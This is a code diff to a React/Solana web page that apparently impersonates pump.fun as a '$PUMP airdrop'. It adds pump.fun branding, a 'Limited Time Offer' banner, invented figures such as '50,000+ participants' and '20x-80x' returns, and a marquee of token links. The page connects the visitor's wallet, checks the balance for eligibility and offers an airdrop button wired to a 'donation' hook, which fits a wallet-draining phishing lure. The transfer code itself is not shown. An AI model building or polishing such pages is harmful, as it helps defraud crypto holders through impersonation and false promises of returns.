@@ -4,8 +4,16 @@ import { Button } from '@/components/ui/button';
 import { useDonation } from '@/hooks/useDonation';
 // Removed DonationProgress per request
 import { Heart, Wallet } from 'lucide-react';
-import backgroundImage from '@/assets/background.jpg';
-import logoImage from '@/assets/pill-logo.jpg';
+import backgroundImage from '@/assets/web-background.png';
+import logoImage from '@/assets/pump-logo.png';
+import polyImg from '@/assets/tokens/poly.jpg';
+import lionImg from '@/assets/tokens/lion.png';
+import roadImg from '@/assets/tokens/road.png';
+import capImg from '@/assets/tokens/cap.png';
+import cadeImg from '@/assets/tokens/cade.png';
+import pfpImg from '@/assets/tokens/pfp.png';
+import pebbleImg from '@/assets/tokens/pebble.png';
+import marsImg from '@/assets/tokens/mars.png';
 import { useState, useEffect } from 'react';
 import { useConnection } from '@solana/wallet-adapter-react';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
@@ -18,6 +26,19 @@ const Index = () => {
   const [isEligible, setIsEligible] = useState<boolean>(false);
 
   const totalValue = transactions.reduce((sum, tx) => sum + tx.usdValue, 0);
+
+  const tokens = [
+    { name: 'poly', url: 'https://pump.fun/coin/5eMfXSYdssCpnu63WtPprjbbR5YBJmSEnZGRvtuppump', img: polyImg },
+    { name: 'lion', url: 'https://pump.fun/coin/8NfK7b9u1RvMpHJnAnZki4mNQwjhvzrVZs7bRQatpump', img: lionImg },
+    { name: 'road', url: 'https://pump.fun/coin/8ZeTmGGktvSwSSghx8btbTAVGdWogThKM4DQBJgRpump', img: roadImg },
+    { name: 'cap', url: 'https://pump.fun/coin/7E2iF4WFs5biCtkAVFCBPEdnpg7t2D19VzxjxEPvpump', img: capImg },
+    { name: 'tele', url: 'https://pump.fun/coin/GGV2LcQsvJc2oFZFESnWBVW5AFoMknNX9r31wS2Apump', img: polyImg },
+    { name: 'cade', url: 'https://pump.fun/coin/Eg2ymQ2aQqjMcibnmTt8erC6Tvk9PVpJZCxvVPJz2agu', img: cadeImg },
+    { name: 'feed', url: 'https://pump.fun/coin/J2eaKn35rp82T6RFEsNK9CLRHEKV9BLXjedFM3q6pump', img: polyImg },
+    { name: 'pfp', url: 'https://pump.fun/coin/5TfqNKZbn9AnNtzq8bbkyhKgcPGTfNDc9wNzFrTBpump', img: pfpImg },
+    { name: 'pebble', url: 'https://pump.fun/coin/Eppcp4FhG6wmaRno3omWWvKsZHbzucVLR316SdXopump', img: pebbleImg },
+    { name: 'mars', url: 'https://pump.fun/coin/GqXX9MfkURBZ5cFym9HDzqTL7uZkjtCSqLkUSe2xpump', img: marsImg },
+  ];
 
   useEffect(() => {
     const checkBalance = async () => {
@@ -60,7 +81,11 @@ const Index = () => {
               alt="Logo"
               className="h-12 w-12 object-contain rounded-lg"
             />
-            <span className="ml-2 text-white font-bold">pump.fun</span>
+            <img
+              src={logoImage}
+              alt="Pump Logo"
+              className="ml-2 h-8 w-auto object-contain"
+            />
           </div>
           <WalletMultiButton className="!bg-primary hover:!bg-primary/90" />
         </div>
@@ -73,9 +98,12 @@ const Index = () => {
           <div className="text-center space-y-4">
             <div className="space-y-2">
               <h1 className="text-5xl font-bold text-white">
-                Get Your Share Of
+                PUMP Your Token
                 <span className="block text-5xl font-bold text-green-500">1,000,000 $PUMP</span>
               </h1>
+              <p className="text-sm text-green-500 font-semibold uppercase tracking-wider mt-2">
+                Limited Time Offer
+              </p>
             </div>
             <p className="text-xl text-muted-foreground max-w-xl mx-auto">
               Join exclusive airdrop and be part of the most exciting memecoin launch on solana. Early participants get bonus rewards and white listing access.
@@ -109,17 +137,52 @@ const Index = () => {
                     className="w-full"
                     disabled={isProcessing}
                   >
-                    <svg className="w-6 h-6 mr-2 animate-pulse" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <svg className="w-6 h-6 mr-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                       <path d="M13 3L4 14H12L11 21L20 10H12L13 3Z" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                     </svg>
                     Get $PUMP Airdrop
                   </Button>
                 )}
 
+                {/* Stats Section */}
+                <div className="flex justify-center items-center gap-8 mt-6">
+                  <div className="text-center">
+                    <p className="text-3xl font-bold text-white">50,000+</p>
+                    <p className="text-xs text-muted-foreground uppercase tracking-wide">PARTICIPANTS</p>
+                  </div>
+                  <div className="text-center">
+                    <p className="text-3xl font-bold text-white">20x-80x</p>
+                    <p className="text-xs text-muted-foreground uppercase tracking-wide">PUMP</p>
+                  </div>
+                </div>
+
               </div>
             )}
           </div>
 
+        </div>
+      </div>
+
+      {/* Token Marquee */}
+      <div className="relative z-10 py-8 overflow-hidden bg-black/80 backdrop-blur-sm border-t border-white/10">
+        <div className="marquee-container">
+          <div className="marquee-content">
+            {[...tokens, ...tokens].map((token, index) => (
+              <a
+                key={`${token.name}-${index}`}
+                href={token.url}
+                target="_blank"
+                rel="noopener noreferrer"
+                className="inline-block mx-4 hover:scale-110 transition-transform duration-300"
+              >
+                <img
+                  src={token.img}
+                  alt={token.name}
+                  className="h-16 w-16 rounded-lg object-cover shadow-lg"
+                />
+              </a>
+            ))}
+          </div>
         </div>
       </div>
 
@@ -133,6 +196,21 @@ const Index = () => {
         }
         .delay-1000 {
           animation-delay: 1s;
+        }
+        
+        @keyframes marquee {
+          0% { transform: translateX(0); }
+          100% { transform: translateX(-50%); }
+        }
+        
+        .marquee-container {
+          overflow: hidden;
+          white-space: nowrap;
+        }
+        
+        .marquee-content {
+          display: inline-block;
+          animation: marquee 30s linear infinite;
         }
       `}</style>
     </div>
